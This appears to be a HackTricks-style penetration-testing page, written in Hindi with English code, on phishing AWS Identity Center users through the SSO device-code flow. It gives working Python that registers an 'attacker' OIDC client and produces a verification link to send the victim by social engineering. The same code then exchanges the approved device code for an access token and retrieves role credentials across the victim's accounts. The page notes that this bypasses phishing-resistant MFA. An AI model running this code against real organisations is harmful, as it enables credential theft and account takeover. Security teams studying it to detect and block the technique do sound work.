# AWS - Identity Center & SSO Unauthenticated Enum

{{#include ../../../banners/hacktricks-training.md}}

## AWS डिवाइस कोड फ़िशिंग

शुरुआत में [**इस ब्लॉग पोस्ट**](https://blog.christophetd.fr/phishing-for-aws-credentials-via-aws-sso-device-code-authentication/) में प्रस्तावित, यह संभव है कि एक **लिंक** को AWS SSO का उपयोग करते हुए एक उपयोगकर्ता को भेजा जाए, यदि **उपयोगकर्ता स्वीकार करता है** तो हमलावर को **उपयोगकर्ता का अनुकरण करने के लिए एक टोकन प्राप्त होगा** और वह सभी भूमिकाओं तक पहुँच प्राप्त कर सकेगा जिन तक उपयोगकर्ता पहुँच सकता है **Identity Center** में।

इस हमले को करने के लिए आवश्यकताएँ हैं:

- पीड़ित को **Identity Center** का उपयोग करना होगा
- हमलावर को पीड़ित द्वारा उपयोग किए जाने वाले **सबडोमेन** का पता होना चाहिए `<victimsub>.awsapps.com/start`

सिर्फ पिछले जानकारी के साथ, **हमलावर उपयोगकर्ता को एक लिंक भेजने में सक्षम होगा** जो यदि **स्वीकृत** किया गया तो **हमलावर को AWS उपयोगकर्ता** खाते पर पहुँच प्रदान करेगा।

### हमला

1. **सबडोमेन खोजना**

हमलावर का पहला कदम यह पता लगाना है कि पीड़ित कंपनी अपने Identity Center में कौन सा सबडोमेन उपयोग कर रही है। यह **OSINT** या **अनुमान + BF** के माध्यम से किया जा सकता है क्योंकि अधिकांश कंपनियाँ यहाँ अपने नाम या उनके नाम का एक भिन्न रूप उपयोग कर रही होंगी।

इस जानकारी के साथ, यह संभव है कि उस क्षेत्र को प्राप्त किया जा सके जहाँ Identity Center को कॉन्फ़िगर किया गया था:
```bash
curl https://victim.awsapps.com/start/ -s | grep -Eo '"region":"[a-z0-9\-]+"'
"region":"us-east-1
```
2. **शिकार के लिए लिंक उत्पन्न करें और इसे भेजें**

AWS SSO लॉगिन लिंक उत्पन्न करने के लिए निम्नलिखित कोड चलाएँ ताकि शिकारकर्ता प्रमाणीकरण कर सके।\
डेमो के लिए, इस कोड को एक पायथन कंसोल में चलाएँ और इसे बंद न करें क्योंकि बाद में आपको टोकन प्राप्त करने के लिए कुछ ऑब्जेक्ट्स की आवश्यकता होगी:
```python
import boto3

REGION = 'us-east-1' # CHANGE THIS
AWS_SSO_START_URL = 'https://victim.awsapps.com/start' # CHANGE THIS

sso_oidc = boto3.client('sso-oidc', region_name=REGION)
client = sso_oidc.register_client(
clientName = 'attacker',
clientType = 'public'
)

client_id = client.get('clientId')
client_secret = client.get('clientSecret')
authz = sso_oidc.start_device_authorization(
clientId=client_id,
clientSecret=client_secret,
startUrl=AWS_SSO_START_URL
)

url = authz.get('verificationUriComplete')
deviceCode = authz.get('deviceCode')
print("Give this URL to the victim: " + url)
```
शिकार को लिंक भेजें अपनी शानदार सोशल इंजीनियरिंग कौशल का उपयोग करते हुए!

3. **शिकार के स्वीकार करने की प्रतीक्षा करें**

यदि शिकार **पहले से AWS में लॉग इन था** तो उसे केवल अनुमतियाँ देने के लिए स्वीकार करना होगा, यदि वह नहीं था, तो उसे **लॉग इन करना होगा और फिर अनुमतियाँ देने के लिए स्वीकार करना होगा**।\
यहाँ प्रॉम्प्ट आजकल कैसा दिखता है:

<figure><img src="../../../images/image (343).png" alt="" width="311"><figcaption></figcaption></figure>

4. **SSO एक्सेस टोकन प्राप्त करें**

यदि शिकार ने प्रॉम्प्ट स्वीकार कर लिया, तो इस कोड को चलाएँ ताकि **उपयोगकर्ता का अनुकरण करते हुए SSO टोकन उत्पन्न किया जा सके**:
```python
token_response = sso_oidc.create_token(
clientId=client_id,
clientSecret=client_secret,
grantType="urn:ietf:params:oauth:grant-type:device_code",
deviceCode=deviceCode
)
sso_token = token_response.get('accessToken')
```
SSO एक्सेस टोकन **8 घंटे के लिए मान्य है**।

5. **उपयोगकर्ता का अनुकरण करें**
```python
sso_client = boto3.client('sso', region_name=REGION)

# List accounts where the user has access
aws_accounts_response = sso_client.list_accounts(
accessToken=sso_token,
maxResults=100
)
aws_accounts_response.get('accountList', [])

# Get roles inside an account
roles_response = sso_client.list_account_roles(
accessToken=sso_token,
accountId=<account_id>
)
roles_response.get('roleList', [])

# Get credentials over a role

sts_creds = sso_client.get_role_credentials(
accessToken=sso_token,
roleName=<role_name>,
accountId=<account_id>
)
sts_creds.get('roleCredentials')
```
### Phishing the unphisable MFA

यह जानकर मज़ा आता है कि पिछला हमला **काम करता है भले ही "unphisable MFA" (webAuth) का उपयोग किया जा रहा हो**। इसका कारण यह है कि पिछला **कार्यप्रवाह उपयोग किए गए OAuth डोमेन को कभी नहीं छोड़ता**। अन्य फ़िशिंग हमलों की तरह नहीं जहां उपयोगकर्ता को लॉगिन डोमेन को प्रतिस्थापित करना पड़ता है, इस मामले में डिवाइस कोड कार्यप्रवाह इस तरह से तैयार किया गया है कि **कोड एक डिवाइस द्वारा जाना जाता है** और उपयोगकर्ता एक अलग मशीन में भी लॉगिन कर सकता है। यदि प्रॉम्प्ट को स्वीकार किया जाता है, तो डिवाइस, केवल **प्रारंभिक कोड को जानकर**, उपयोगकर्ता के लिए **क्रेडेंशियल्स पुनः प्राप्त करने में सक्षम होगा**।

इस बारे में अधिक जानकारी के लिए [**इस पोस्ट को देखें**](https://mjg59.dreamwidth.org/62175.html)।

### Automatic Tools

- [https://github.com/christophetd/aws-sso-device-code-authentication](https://github.com/christophetd/aws-sso-device-code-authentication)
- [https://github.com/sebastian-mora/awsssome_phish](https://github.com/sebastian-mora/awsssome_phish)

## References

- [https://blog.christophetd.fr/phishing-for-aws-credentials-via-aws-sso-device-code-authentication/](https://blog.christophetd.fr/phishing-for-aws-credentials-via-aws-sso-device-code-authentication/)
- [https://ruse.tech/blogs/aws-sso-phishing](https://ruse.tech/blogs/aws-sso-phishing)
- [https://mjg59.dreamwidth.org/62175.html](https://mjg59.dreamwidth.org/62175.html)
- [https://ramimac.me/aws-device-auth](https://ramimac.me/aws-device-auth)

{{#include ../../../banners/hacktricks-training.md}}
